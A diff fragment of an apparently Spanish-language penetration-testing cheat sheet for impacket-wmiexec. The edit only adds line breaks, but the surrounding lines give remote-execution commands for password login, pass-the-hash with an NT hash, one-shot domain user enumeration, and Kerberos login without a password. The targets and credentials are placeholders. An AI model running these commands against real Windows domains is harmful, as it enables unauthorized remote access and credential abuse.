@@ -21,10 +21,16 @@ impacket-wmiexec dominio.local/usuario_admin:Password123@IP_OBJETIVO
 impacket-wmiexec -hashes :HASH_NT dominio.local/usuario_admin@IP_OBJETIVO
 ```
 > Pass-the-Hash
+
+</br>
+
 ```
 impacket-wmiexec -hashes :HASH_NT dominio.local/usuario_admin@IP_OBJETIVO "net user /domain"
 ```
 > Ejecución de Comandos en un Solo Disparo (Non-interactive)
+
+</br>
+
 ```
 impacket-wmiexec -k -no-pass dominio.local/usuario_admin@NOMBRE_HOST_FQDN
 ```
